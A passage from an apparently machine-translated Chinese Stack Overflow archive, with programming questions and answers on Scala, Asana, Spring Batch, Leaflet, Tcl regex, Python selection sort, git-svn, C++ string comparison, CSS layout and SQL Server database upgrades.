        case (x::xs)  => union(s + x, xs.toSet)
        case _       => throw new Error("bad input")
    }
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-10-02T20:28:57.940

这是我能想到的：

```
object Contains {
  class Unapplier[T](val t: T) {
    def unapply(s: Set[T]): Option[Boolean] = Some(s contains t)
  }
  def apply[T](t: T) = new Unapplier(t)
}

object SET {
  class Unapplier[T](val set: Set[T]) {
    def unapply(s: Set[T]): Option[Unit] = if (set == s) Some(Unit) else None
  }
  def apply[T](ts: T*) = new Unapplier(ts.toSet)
}

val Contains2 = Contains(2)
val SET123 = SET(1, 2, 3)

Set(1, 2, 3) match {
  case SET123()         => println("123")
  case Contains2(true)  => println("jippy")
  case Contains2(false) => println("ohh noo")
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2019-04-29T10:12:17.970

```
 t match {
      case s if s.nonEmpty => // non-empty 
      case _ => // empty
    } 
```

# asana - 如何在 Asana 中查看没有受让人和项目的所有任务？

> ID：15163905
> 
> 赞同：1
> 
> 时间：2013-03-01T17:53:18.117
> 
> 标签：asana

特别是如果我不知道它的名字。[相关问题](https://stackoverflow.com/questions/11055051/where-is-my-task-with-no-assignee-or-project-in-asana)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-06-24T15:18:13.253

您可以使用新搜索来做到这一点（在[http://blog.asana.com/2013/04/asana-search-views/#more-1188](http://blog.asana.com/2013/04/asana-search-views/#more-1188)中公布）

1.  单击搜索字段上的下拉按钮。
2.  搜索“Assigned to `Nobody`; In projects `No Project`”（两个字段都将从“No”自动完成）
3.  点击搜索，看到你的结果，高兴！

# spring - Spring Batch 和 Hibernate - 群发电子邮件应用程序

> ID：15163906
> 
> 赞同：1
> 
> 时间：2013-03-01T17:53:25.660
> 
> 标签：spring, hibernate, email, batch-processing, spring-batch

我们正在开发一个基于 Spring 批处理和 Hibernate 的应用程序，它将负责发送 1000 封电子邮件。

简而言之，目前只有一个步骤定义了一个作业。

```
<job id="emailJob" xmlns="http://www.springframework.org/schema/batch" restartable="true"
     job-repository="jobRepository">
    <step id="emailJobFetchUsers">
        <tasklet>
            <chunk reader="emailItemReader" processor="emailItemProcessor" writer="emailItemWriter" commit-interval="1"/>
        </tasklet>
        <end on="COMPLETED"/>
        <fail on="FAILED"/>
    </step>
    <listeners>
        <listener ref="loggingListener"/>
    </listeners>
</job> 
```

*   emailItemReader 扩展了 HibernateCursorItemReader 并将返回行的实体（在这种情况下，代表客户选择的电子邮件的记录）
*   emailItemProcessor 生成并发送客户特定的电子邮件
*   emailItemWriter 只是更新实体，其中包含一些信息，例如上次发送日期

虽然这可行，但我不确定它是否应该都是一个步骤，或者是否应该有一个步骤负责每个动作。我主要关心的是可重启性和恢复。也就是说，一个用户会发生这种异常（可能是由于电子邮件地址无效或生成电子邮件的问题），或者如果应用程序服务器出现故障并重新启动，我希望它能够从它离开的地方接收发送电子邮件离开。

任何人都可以就上述问题提出建议吗？

谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-02T00:38:25.747

是的，它应该可以重新启动。检查读者超类的 javadoc。但是，您需要注意以下事项：

*   您需要在查询中保持顺序 - 阅读器将从失败的项目开始，因此每个查询执行必须以相同的顺序返回项目
*   如果 itemWriter 中的实体修改影响查询结果可能会很棘手 - 如果您按上次发送日期过滤，那么它将无法按预期工作

更重要的是，我相信如果发生以下情况：

1.  作业执行失败
2.  将新客户插入数据库\
3.  工作重新开始

那么查询结果也可能与第一次（失败）执行期间不同。如果您的应用程序中可能出现这种情况，那么我建议添加一些条件来防止它 - 例如在查询中添加检查以跳过在第一次作业执行时间后注册的客户。

# javascript - Leaflet.js 中的移位 TileLayer

> ID：15163907
> 
> 赞同：0
> 
> 时间：2013-03-01T17:53:27.537
> 
> 标签：javascript, maps, gis, leaflet

我想理想地显示几个较长的（4096x20k）图像边缘到边缘，但之间的一些填充也不会受到伤害。. .

如果图像看起来像 []，则所需的输出将类似于：[][][][]，并且仍然可以适当地平铺。. .

我知道我可以做到这一点的一些 hackey 方法，但我理想地寻找的是类似的东西： L.tileLayer('blah{x}blah{y}blah{z}', {shiftTilesBy: [xOffset, yOffset] });

我什至无法真正弄清楚传单如何计算平铺图像的范围。它只是继续请求每个轴上的图块直到它达到 404 吗？我希望将图像保留在不同的层中，因为我经常更新其中的一个或多个，因此从缓存等的角度来看，将图像预先融合成一个大的确实没有吸引力。

如果这不作为插件或类似插件存在，我将编写并贡献它。那么，作为一个后续问题，我应该从哪里开始寻找源代码来创建它？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-03T22:57:36.447

Instead of having 4 separate maps, could you use one map and use an overlay to break the map into 4 tiles?

Here's the HTML:

```
<body>
  <div id="map"></div>
  <div id="overlay">
    <div></div>
    <div></div>
    <div></div>
    <div></div>
  </div>
</body> 
```

And the CSS:

```
html {
    overflow:hidden;
}

html,
body,
#map,
#overlay {
    width:100%;
    height:100%;
    position:absolute;
}

#overlay {
    position:absolute;
    top:0;
    left:0;
    /* Requred if you want the map to respond to pointer events */
    pointer-events:none;
}

#overlay div {
    height:100%;
    border-right:15px solid #FFFFFF;
    width:23%;
    float:left;
} 
```

And now the whole shebang, here is [a jsFiddle](http://jsfiddle.net/brettdewoody/pAkdq/).

And here's the result: ![Leaflet 4-column example](../Images/5302e5765dfafbd3730041f2cd71f440.png)

# asp.net-mvc-3 - 如何更改此代码块以仅返回与特定 ID 关联的记录。？

> ID：15163908
> 
> 赞同：0
> 
> 时间：2013-03-01T17:53:33.687
> 
> 标签：asp.net-mvc-3, linq

我正在尝试创建一个查询，该查询返回与一个人的 id 关联的记录。

我试过这个：

```
viewModel.Students = db.Students.Where(sd => sd.StudentID==9); 
```

但我不知道如何将它投射到我的身上，`InstructorIndexData()`或者我是否应该那样做。如何更改此代码块以仅返回学生`id==9`？

```
var viewModel2 = new InstructorIndexData();
viewModel.Courses = viewModel.Instructors.Where(
    i => i.InstructorID == 2).Single().Courses               

viewModel.Enrollments = viewModel.Courses.Where(
    x => x.CourseID == 600).Single().Enrollments;

viewModel2.Students = db.Students.Where(sd => sd.StudentID==9);
return View(viewModel); 
```

**讲师索引数据：**

```
public class InstructorIndexData
{
    public IEnumerable<Instructor> Instructors { get; set; }
    public IEnumerable<Course> Courses { get; set; }
    public IEnumerable<Enrollment> Enrollments { get; set; }
    public IEnumerable<Student> Students { get; set; }
    public IEnumerable<Assignment> Assignments { get; set; }
} 
```

# javascript - 更改 JavaScript 包含文件中的活动链接

> ID：15163910
> 
> 赞同：0
> 
> 时间：2013-03-01T17:53:34.510
> 
> 标签：javascript, include, background-color

我正在使用 JavaScript(JS) 包含在几个 HTML 页面中呈现选项卡菜单。JS 包含工作正常 - 选项卡呈现。但是，我想在页面处于活动状态时更改选项卡的背景颜色。有谁知道如何做到这一点？我所有的文件都是外部文件（即外部 CSS 和 JS 文件）。

提供的是我的代码片段。

```
// JavaScript Document

document.write('<ul id="tabMenu">');
document.write('<li><a id="sbac" href="sbac_courses.html"><img src="../images/rlbm.png" width="149" height="52" /></a></li>');
document.write('<li><a id="nbm" href="nbm.html"><img src="../images/nbm.png" width="149" height="52" /></a></li>');
document.write('<li><a id="sbo" href="sbo.html"><img src="../images/sbo.png" width="149" height="52" /></a></li>');
document.write('</ul>');

switch (selected) {
        case 'sbac':
            $('ul li a').css('bgColor','#FCB314');
            break;
        case 'nbm':
            $('ul li a').css('bgColor','#FCB314');
            break;
        case 'sbo':
            $('ul li a').css('bgColor','#FCB314');
            break;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T18:11:54.980

您可能需要稍微修改路径名，但您可以执行类似的操作

```
var page = location.pathname; //Parse this to get the page ex: nbm.html
$('#tabMenu [href="' + page + '"]').closest('li').css('background-color','#FCB314'); 
```

您上面的代码似乎不起作用，因为您使用的是 'bgColor' 而不是 'background-color'

# tcl - 从输出中提取特定值

> ID：15163911
> 
> 赞同：1
> 
> 时间：2013-03-01T17:53:37.257
> 
> 标签：tcl

我有一个寻呼路由器输出为

```
set pagent_ouput "Interface:    Ethernet2/3

packetfilter:   2500 123bps 456.123pps
packetfilter:   2300 345bps 345.548pps

Interface:    Ethernet3/4

packetfilter:   2500 123bps 896.163pps
packetfilter:   2300 345bps 675.748pps" 
```

以太网接口各不相同....我想为每个我想要的以太网接口提取 pps 值 `{ {456.123 345.548} {896.163 675.748}}`

如果 pagent_output 变化为

```
set pagent_output "Interface:    Ethernet2/3

packetfilter:   2500 123bps 456.123pps
packetfilter:   2300 345bps 345.548pps
packetfilter:   2300 645bps 445.548pps
packetfilter:   2300 745bps 545.548pps

Interface:    Ethernet3/4

packetfilter:   2500 123bps 656.123pps
packetfilter:   2300 345bps 745.548pps
packetfilter:   2300 345bps 845.548pps
packetfilter:   2300 345bps 945.548pps

Interface:    Ethernet3/5

packetfilter:   2500 123bps 156.123pps
packetfilter:   2300 345bps 255.548pps
packetfilter:   2300 345bps 375.548pps
packetfilter:   2300 345bps 395.548pps"

the list will be { {456.123 345.548 445.548 545.548} {656.123 745.548 845.548 945.548} 
{156.123 255.548 375.548 395.548}} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-02T15:03:49.293

首先，您需要将文本在行上分成几块`Interface`，然后从这些块中提取数据。（即使有其他方法可以做到这一点，这种方式更容易分解问题，因为从连接的小问题而不是一个大问题的角度来考虑更大的问题更容易。）我们将使用常规进行提取的表达式；要遵循 Tcl 的准确 REs 方言，请务必查看[相关手册页](http://www.tcl.tk/man/tcl8.6/TclCmd/re_syntax.htm)。

要将数据拆分为每个接口的部分，我建议使用[`textutil::split::splitx`](http://tcllib.sourceforge.net/doc/textutil_split.html)来自[Tcllib](http://tcllib.sourceforge.net/)的命令。

```
package require textutil::split

set interface_data [textutil::split::splitx $pagent_output {(?n)^Interface:.*$}] 
```

然后，我们要从每个接口的数据中获取 pps 值；[`regexp`](http://www.tcl.tk/man/tcl8.6/TclCmd/regexp.htm)使用`-all -inline`选项是最好的工具：

```
set result {}
foreach item [lrange $interface_data 1 end] {
    lappend result [regexp -all -inline {\m[0-9.]+(?=pps)} $item]
} 
```

现在，该`result`变量包含您所追求的。

* * *

如果您已升级到 Tcl 8.6，则可以通过使用以下命令来缩短这一切`lmap`：

```
package require textutil::split

set result [lmap item [lrange [textutil::split::splitx $pagent_output {(?n)^Interface:.*$}] 1 end] {
    regexp -all -inline {\m[0-9.]+(?=pps)} $item
}] 
```

尽管如此，它仍然是相同的基本思想。`textutil::split::splitx`将事情分开（因为手动这样做有点拖累）并`regexp -all -inline`循环提取信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T23:55:58.377

我已经从 cisco 路由器中提取了一些输出以用于接口输出。不确定这有什么帮助。

我认为 tcl regexp 命令是你最好的选择。我不是 tcl 方面的专家，但是使用正则表达式，您可以匹配括号中的任何内容。

```
set output "
packetfilter:   2500 123bps 456.123pps
packetfilter:   2300 345bps 345.548pps
packetfilter:   2300 645bps 445.548pps
packetfilter:   2300 745bps 545.548pps"

foreach line [split $output "\n"] {
set findpps [regexp {bps\s([0-9]+)\.([0-9]+)pps} $line fullmatch sub1 sub2]
if {$findpps == 1} {
puts "Int Eth2/3 PPS output is $sub1.$sub2"
}
} 
```

如果找到正则表达式，则将输出分成几行，它将 = 1。 sub1 是“123bps”之后的第一个数字，sub2 是第二个数字

在 cisco 领域，如果您想要所有接口的值，您可以编写一个脚本，通过“exec 命令”获取所有接口输出，并以这种方式解析所有数据。

# python - Python：选择排序

> ID：15163913
> 
> 赞同：0
> 
> 时间：2013-03-01T17:53:44.637
> 
> 标签：python

我想将以下 JAVA 代码转换为 python（我是 Python 的初学者）

```
public void selectionSort(int[] arr) {
      int i, j, minIndex, tmp;
      int n = arr.length;
      for (i = 0; i < n - 1; i++) {
            minIndex = i;
            for (j = i + 1; j < n; j++)
                  if (arr[j] < arr[minIndex])
                        minIndex = j;
            if (minIndex != i) {
                  tmp = arr[i];
                  arr[i] = arr[minIndex];
                  arr[minIndex] = tmp;
            }
      }
} 
```

这是我写的，但它不起作用，我无法弄清楚我做错了什么

```
A = [86, 2,4 ,5, 6122, 87]

def selectionSort(a):
    n = len(a)
    print ("n = ", n)
    for i in range (0, n-1):
        minIndex = i
        j = i+1
        for j in range (0, n):
            if(a[j] < a[minIndex]):
                minIndex = j
        if minIndex != i:
            tmp = a[i]
            a[i] = a[minIndex]
            a[minIndex] = tmp

selectionSort(A)
print(A) 
```

请帮我理解为什么

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:58:32.837

改变两行

```
j = i+1
for j in range (0, n): 
```

至

```
for j in range (i+1, n): 
```

匹配

```
for (j = i + 1; j < n; j++) 
```

其他挑剔

在 python 中交换被优雅地完成为

```
a[i], a[minIndex] = a[minIndex], a[i] 
```

和整个街区

```
 minIndex = i
    for j in range (i+1, n):
        if(a[j] < a[minIndex]):
            minIndex = j
    if minIndex != i:
        a[i], a[minIndex] = a[minIndex], a[i] 
```

可以重构为

```
 minIndex = min(range(i,n), key = partial(getitem, a))
    a[i], a[minIndex] = a[minIndex], a[i] 
```

前提是您[从 functools 导入 partial](http://docs.python.org/2/library/functools.html#functools.partial)并[从 operator导入 getitem](http://docs.python.org/2/library/operator.html#operator.getitem)

```
from functools import partial
from operator import getitem 
```

所以你的最终版本看起来像

```
from functools import partial
from operator import getitem
def selectionSort(a):
    n = len(a)
    for i in range (n-1):
        minIndex = min(range(i,n), key = partial(getitem, a))
        a[i], a[minIndex] = a[minIndex], a[i] 
```

**最后看到哪个会让你想知道将 Java 代码转换为 Python 作为练习是否确实是学习 Python 的好方法**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:58:27.910

```
for j in range (0, n) 
```

与使用 i+1 开始的 Java 不同。

实现选择排序的更 Pythonic 方式可能如下所示：

```
A = [86, 2,4 ,5, 6122, 87]
def selectionSort(a):
    # Go through all positions except the last one 
    # (that one will automatically be correct)
    for index in range(len(a)-1):
        value = a[index]
        # enumerate all (index, value) pairs from the rest of the list 
        # and take the pair with the smallest value
        min_subindex, min_value = min(enumerate(a[index+1:]), key=lambda x: x[1])
        if min_value < value:
            a[index] = min_value
            a[min_subindex + index + 1] = value

selectionSort(A)
print(A) # [2, 4, 5, 86, 87, 6122] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T17:59:16.970

问题：

1.  当你这样做`j in range(0, n-1)`时，它将在`0`而不是开始循环`i+1`。

利用

```
for j in range(i+1, n-1) 
```

工作代码：

```
A = [86, 2,4 ,5, 6122, 87]

def selectionSort(a):
    n = len(a)
    print ("n = ", n)
    for i in range (0, n-1):
        minIndex = i
        for j in range (i+1, n):
            if(a[j] < a[minIndex]):
                minIndex = j

        if minIndex != i:
            a[i], a[minIndex] = a[minIndex], a[i]

selectionSort(A)
print(A) 
```

# git - Git-svn - 导入完整历史

> ID：15163916
> 
> 赞同：13
> 
> 时间：2013-03-01T17:53:50.017
> 
> 标签：git, svn, git-svn

**问题**

默认情况下， *git svn clone*仅从分支创建开始导入历史记录，尽管事实上，文件的历史记录在分支创建之前存在于 SVN 存储库中。

我们的 SVN 分支是由创建的`svn copy`，如果这很重要的话。

**我的尝试**

我试过`--no-minimize-url`and `--follow-parent`，但没有成功。从分支创建开始，生成的 Git 存储库与没有这些参数的情况相同。

**期望的结果**

Git 存储库，包含 SVN 存储库创建的完整历史记录。

**更新**

我的实际命令行是

```
git svn clone http://svnserver/repo/dir1/dir2/project 
```

有帮助的是`-T`结果命令的争论：

```
git svn clone http://svnserver/repo/ -T dir1/dir2/project 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-02T01:31:00.197

> 默认情况下，git svn clone 仅从分支创建开始导入历史记录，尽管事实上，文件的历史记录在分支创建之前存在于 svn 存储库中。

是的。那是真实的。`git svn`如果被告知，只会尝试将分支作为分支导入。从 git-svn 的手册页：

> 克隆 SVN 存储库时，如果没有使用任何描述存储库布局的选项（--trunk、--tags、--branches、--stdlayout），git svn clone 将创建一个具有完全线性历史的 git 存储库，其中分支和标签在工作副本中显示为单独的目录。

如果您将一个分支的 URL 传递给`git svn clone`（而不是顶级 URL），您将只能获得该分支的线性历史记录。这可能就是您所看到的。

如果您想要完整的历史记录，请使用上面提到的存储库布局选项，并传递顶级 URL。然后`git svn`将尝试为 SVN 分支创建 git 分支，并尝试为它们提供正确的历史记录，回溯到它们创建之前。

请注意，这将为您提供包含所有分支的完整存储库。如果您只想要一些分支，则需要按照手册页中的说明修改配置：

> 也可以通过在大括号中使用逗号分隔的名称列表来获取分支或标签的子集。例如：
> 
> ```
>  [svn-remote "huge-project"]
>                url = http://server.org/svn
>                fetch = trunk/src:refs/remotes/trunk
>                branches = branches/{red,green}/src:refs/remotes/branches/*
>                tags = tags/{1.0,2.0}/src:refs/remotes/tags/* 
> ```

见[git-svn(1)](https://www.kernel.org/pub/software/scm/git/docs/git-svn.html#_configuration)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-02T12:09:13.990

[http://git-scm.com/book/en/Git-and-Other-Systems-Migrating-to-Git](http://git-scm.com/book/en/Git-and-Other-Systems-Migrating-to-Git)描述了如何正确导入分支和标签。

# javascript - JavaScript 查找、显示节点

> ID：15163924
> 
> 赞同：0
> 
> 时间：2013-03-01T17:54:31.260
> 
> 标签：javascript, html, nodes

有软件可以将“由...驱动”的文本和图像添加到链接中。在它的许可证中，它说不禁止删除该添加。我可以手动完成，但是当我刷新页面时，再次添加了供电的东西，所以我需要一些东西来隐藏它。有几种方法，但我想用javascript帮助来做。所以这里是我在每个页面底部的内容：

![标识](../Images/997d0a30af655904b5f8be0800ffba24.png)

这是我可以看到的代码：

```
</td></tr></table>
</td></tr></table>
<br/><br/><center><small> <a href="http://pages.ebay.com/blackthorne/" target="_blank"><img align=absbottom border=0 src="http://www.blackthornesw.com/bthome/BlackthorneB2Shade_GB.bmp"</img></a></small></center><br/><center><font face=Arial,Helvetica size=2>Powered by <a href="http://pages.ebay.com/blackthorne/" target="_blank">eBay Blackthorne 04.11.017</a></font></center>
<script>
function ErrorOff() {return true;}
window.onerror = ErrorOff;
setTimeout("document.images.eBayBig.style.display='none'",300);
</script> 
```

在这段代码之前（在 HTML 的底部），我添加了我在互联网上找到的 javascript，我得到了这个结果： ![在此处输入图像描述](../Images/923db8642858c333291a1561098c6d3b.png)

这是完整的代码（使用我找到的 javascript）：

```
<SCRIPT type=text/javascript>
window.onload=function(){
findcenter();
}
function findcenter()
{
nodes = document.getElementsByTagName("center");
subnode = nodes[nodes.length-1];
var link = subnode.getElementsByTagName("a")[0].href;
if(link.indexOf("pages.ebay") != -1)
{
subnode.style.display="none";
}
}
</SCRIPT>
</td></tr></table>
</td></tr></table>
<br/><br/><center><small> <a href="http://pages.ebay.com/blackthorne/" target="_blank"><img align=absbottom border=0 src="http://www.blackthornesw.com/bthome/BlackthorneB2Shade_GB.bmp"</img></a></small></center><br/><center><font face=Arial,Helvetica size=2>Powered by <a href="http://pages.ebay.com/blackthorne/" target="_blank">eBay Blackthorne 04.11.017</a></font></center>
<script>
function ErrorOff() {return true;}
window.onerror = ErrorOff;
setTimeout("document.images.eBayBig.style.display='none'",300);
</script> 
```

如您所见，“Powered by...”文本消失了，但图像仍然出现。我应该如何更改这个图像也会消失的 javascript？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T18:12:40.920

我自己做的，如果有人能以某种方式优化它，我将不胜感激，这是我的解决方案：

```
<SCRIPT type=text/javascript>
window.onload=function(){
findcenter();
}
function findcenter()
{
nodes = document.getElementsByTagName("small");
subnode = nodes[nodes.length-1];

var link = subnode.getElementsByTagName("a")[0].href;
if(link.indexOf("pages.ebay") != -1)
{
subnode.style.display="none";
}

nodes2 = document.getElementsByTagName("center");
subnode2 = nodes2[nodes2.length-1];

var link2 = subnode2.getElementsByTagName("a")[0].href;
if(link2.indexOf("pages.ebay") != -1)
{
subnode2.style.display="none";
}
}
</SCRIPT> 
```

# c++ - 如何比较参数字符串 Visual C++

> ID：15163933
> 
> 赞同：0
> 
> 时间：2013-03-01T17:55:04.357
> 
> 标签：c++

我想做一些简单的事情：检查参数是什么。

```
void _tmain(int argc, WCHAR *argv[])
{

if(argv[4] == "-h");
{

        //do stuff
}

} 
```

我收到从 WCHAR * 到 const char * 的不兼容错误。

有人问过这样的转换问题，但我找到的答案很多，并不简单。我是 C++ 的新手。

我正在寻找的不是指向某些复杂函数的指针，而是要放入我的程序以使其工作的实际代码。

只是寻找一些简单、直接、有效的代码。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T18:08:21.877

你在这里有两个问题：

1.  将“指向”的指针`char`与字符串对象的逻辑概念混为一谈。在 C（和 C++）中，指向`char`( `char*`) 的指针按照惯例只是 C 风格的字符串。我的意思是如果你终止它（`\0`）并使用适当的库方法。因为指向的指针`char`不是实际的字符串类型，所以您执行的是指针相等而不是逻辑相等。

2.  将宽字符 ( `L"A"`) 与窄字符 ( `"A"`) 混为一谈。这是两个不同的概念，不太可能对您有帮助。

我建议放弃 Unicode 入口点：

```
/* do you really want C or C++? */
int main(int argc, char **argv)
{
    /* now we're "narrow" characters, which will be more natural for you */ 
```

并改进您的测试（或使用[getopt](http://linux.die.net/man/3/getopt)）：

```
 if (0 == strcmp(argv[4], "-h"))
    {
        /* argv[4] is equal to "-h" */ 
```

如果你真的想要 C++，你应该使用`std::string`而不是旧的 C 风格的字符串。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:59:47.597

试试这个：

```
#include <string>

void _tmain(int argc, WCHAR *argv[])
{
    typedef std::basic_string<WCHAR> string_type;
    static const string_type help( TEXT("-h") );

    if(argv[4] == help);
    {
        //do stuff
    }
...
} 
```

我假设 TEXT 宏仍然存在 - 我多年来没有做过任何 windows c++ 编程。

我还假设 -h 代表“帮助”:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T18:06:08.367

```
#include <string.h>
void _tmain(int argc, WCHAR *argv[])
{

   if( 0 == wcscmp(argv[4], L"-h") )
   {

        //do stuff
   }

} 
```

那应该这样做。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T18:09:05.257

您不能比较**指向**字符数组的指针（无论 if`WCHAR*`或`char*`）来检查它们的内容是否相等（它们指向内存中的东西）。

你可以试试…… 像这样：

```
if(std::wstring(argv[4]) == std::wstring(L"-h")) 
{
    // ...
} 
```

# android - 如何让我的 android 小部件等到我获取内容

> ID：15163934
> 
> 赞同：-1
> 
> 时间：2013-03-01T17:55:05.567
> 
> 标签：android, android-widget, android-appwidget

我正在开发一个从我的 api 获取内容的 android 小部件。

我现在使用的是一个自定义函数，它使用 onUpdate => api.getLastItems(MyCallback) 中包含的回调。

MyWidget 提供者：

```
public void onUpdate(Context _context, AppWidgetManager _appWidgetManager,int[] _appWidgetIds) {

  api.getLastItems(new requestCallback() {

     @Override
     public void onFinish(Object object) {
        ArrayList<String> announcs_titles   = (ArrayList<String>)object;
        final int N = widgetId.length;
        for (int i = 0; i < N; i++) {
           Intent myIntent = new Intent(context, WidgetService.class);
           myIntent.putExtra(AppWidgetManager.EXTRA_APPWIDGET_ID,widgetId[i]);
           myIntent.putStringArrayListExtra("itemsTitles",items_titles);
           ...
           appWidgetManager.updateAppWidget(widgetId[i], widget);
        }
     }

  });

  super.onUpdate(context, appWidgetManager, widgetId);
} 
```

**因为 RemoteViewsService.RemoteViewsFactory 使用一个特殊的函数 getViewAt(int position) 需要一个位置才能开始工作，所以我使用这种结构让我的小部件等到我的 ArrayList 项目被填满。**

这是正确的还是有另一种方法？以及如何通过 clickEvent 刷新我的小部件（我的意思是这样做的方式，而不是 PendingIntent.getActivity 代码）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-08T21:28:19.253

我通过使用自定义函数解决了这个问题：我在 WidgetProvider onReceive() 中调用的 load()

```
@Override
public void onReceive(final Context context, Intent intent) {
// Check if nothing is loading and call function load()

}
private void load(){
... 
//1- fetch content from api and set result to a global variable
//2- Call onUpdate(context, appWidgetManager, appWidgetIds);
}
@Override
    public void onUpdate(Context context, AppWidgetManager appWidgetManager,int[] appWidgetIds) {
//add condition to check is loading is completed and my global variable contains something.
} 
```

**如果有人需要有关此方法的帮助，请与我联系**

# css - CSS 布局页脚 DIV 以 100% 的高度消失

> ID：15163936
> 
> 赞同：0
> 
> 时间：2013-03-01T17:55:13.937
> 
> 标签：css, layout, height

我的 CSS 布局有问题。我试图通过 IE 解决问题，一切正常，除了页脚容器消失了！我试图重新编码 CSS，但问题仍然存在。我已经尝试了几天来修复它，但没有任何效果。

我不知道我错过了什么！

这是我所做的`[JSFiddle](http://jsfiddle.net/RA2pj/)`

谁能告诉我我错过了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T18:00:03.547

```
the problem is on this part of the css code: 
overflow: hidden; 
```

它隐藏了页脚

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T18:00:38.480

当您将 body 设置为 hidden `overflow`，然后将`#container`元素设置为 100% 高度时，它会将页脚容器推离屏幕底部。如果您删除了`overflow`声明（因此允许滚动），您会在“折叠”下方看到页脚。

我不确定您的目标是什么，但如果您需要一个非滚动页面（通常是糟糕的可用性实践，仅供参考），您可以使用`position`将页脚粘贴到屏幕底部：

```
/* Footer */
#foot{
 width: 800px;
 height: 150px;
 background: #FFD700;
 position:absolute;
 bottom:0px;
} 
```

查看结果：http: [//jsfiddle.net/euT3x/](http://jsfiddle.net/euT3x/)

否则，删除声明，或在页面加载后使用 javascript`overflow`计算高度。`#container`

**文档**

*   `position`MDN 上的CSS属性 - [https://developer.mozilla.org/en-US/docs/CSS/position](https://developer.mozilla.org/en-US/docs/CSS/position)
*   `height`MDN 上的CSS属性 - [https://developer.mozilla.org/en-US/docs/CSS/height](https://developer.mozilla.org/en-US/docs/CSS/height)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T18:01:02.087

将 Footer DIV 放入 MID div 并使用以下内容修改您的 CSS：[JSFIDDLE 链接在这里](http://jsfiddle.net/eyecode/RA2pj/1/)

```
#mid{
    background: #666666;
    width: 563px;
    text-align: center;
    height: 100%;
    position: relative;
}
#foot{
 width: 800px;
 height: 150px;
 background: #FFD700;
 position: absolute; bottom: 0; left: 0;
} 
```

[JSFIDDLE 链接在这里](http://jsfiddle.net/eyecode/RA2pj/1/)

# sql-server - 如何将 SQL Server 2008 .mdf 文件转换为 SQL Server 2012？

> ID：15163938
> 
> 赞同：5
> 
> 时间：2013-03-01T17:55:16.833
> 
> 标签：sql-server, sql-server-2008, sql-server-2012

我需要将文件`DATABASE.MDF`从 SQL Server 2008 转换为 SQL Server 2012？

> 无法升级数据库“Sales”，因为此版本的 SQL Server 不支持其非发布版本 (539)。您无法打开与此版本的 sqlservr.exe 不兼容的数据库。您必须重新创建数据库。
> 无法打开新数据库“销售”。CREATE DATABASE 已中止。（Microsoft SQL Server，错误：950）

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-03-01T17:56:54.557

只需附加它，它将被升级。如果您没有 LDF 文件（为什么没有 LDF 文件？），您可能必须使用：

```
CREATE DATABASE [DatabaseName] ON 
    (FILENAME = N'Drive:\path\file.mdf')
    FOR ATTACH_REBUILD_LOG; 
```

当然，也有一些注意事项...

*   看到您只有 .mdf 文件，您可能会突然觉醒。如果文件没有从 SQL Server 完全分离，它可能无法重新附加，您必须返回源服务器进行*正确*备份（不是 .mdf 文件）。这完全取决于您从哪里获得要升级的 .mdf 文件。如果您的 .mdf 文件未完全分离，您可能会收到此错误：

> 文件激活失败。物理文件名“..._log.LDF”可能不正确。
> 无法重建日志，因为数据库未完全关闭。
> 消息 1813，级别 16，状态 2，第 1 行
> 无法打开新数据库“数据库名称”。CREATE DATABASE 已中止。

*   如果您的数据库是 80 兼容模式，它将升级到 90。这可能意味着某些工作代码可能会突然中断，例如`*=`/ `=*`join 语法。
*   如果您的数据库大于 10GB，并且您尝试附加到 Express（可能是 LocalDB，从未尝试过），附加将失败（或者可能附加成功但在第一次自动增长时会失败？也没有测试过这个）。
*   如果您的数据库是在 2008 Enterprise / Developer 上创建的，并且您使用了仅在那里可用的功能，并且您将数据库附加到 Standard 或 Express 版本，那么您也会遇到问题...
*   好的，从您的错误消息来看，您根本没有尝试附加 2008 数据库，而是尝试附加 2000 数据库。您不能将其直接附加到 SQL Server 2012。您首先需要将其附加到 SQL Server 2005、2008 或 2008 R2 的任何实例以将其升级到该版本，然后将其备份并恢复到 SQL Server 2012。

FWIW，一种将数据库从一个实例移动到另一个实例的更安全的方法是使用`BACKUP`/ `RESTORE`（原因是如果您的备份失败，您仍然拥有数据库的副本 - 如果您分离数据库，并且发生了一些事情错了，你有零份）。尽管即使采用这种更安全的方法，上述一些问题仍可能适用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-07-31T20:47:27.013

OP 似乎误解了他的数据库类型。SQL Server 的 539 版本不是 2008 而是 SQL Server 2000。请参阅此线程： [SQL Server 文件版本号：我在哪里可以找到参考？](https://stackoverflow.com/questions/1104221/sql-server-file-version-number-where-can-i-find-a-reference)

我在尝试将 SQL Server 2000 db 附加/恢复到 SQL Server 2012 实例时遇到了同样的错误消息。也许有办法解决它，但我所做的是首先转换为 SQL Server 2008 R2，并且然后到 SQL Server 2012。这执行没有问题。

# javascript - 当另一个打开时关闭任何打开的弹出/下拉菜单

> ID：15163942
> 
> 赞同：0
> 
> 时间：2013-03-01T17:55:33.073
> 
> 标签：javascript, jquery

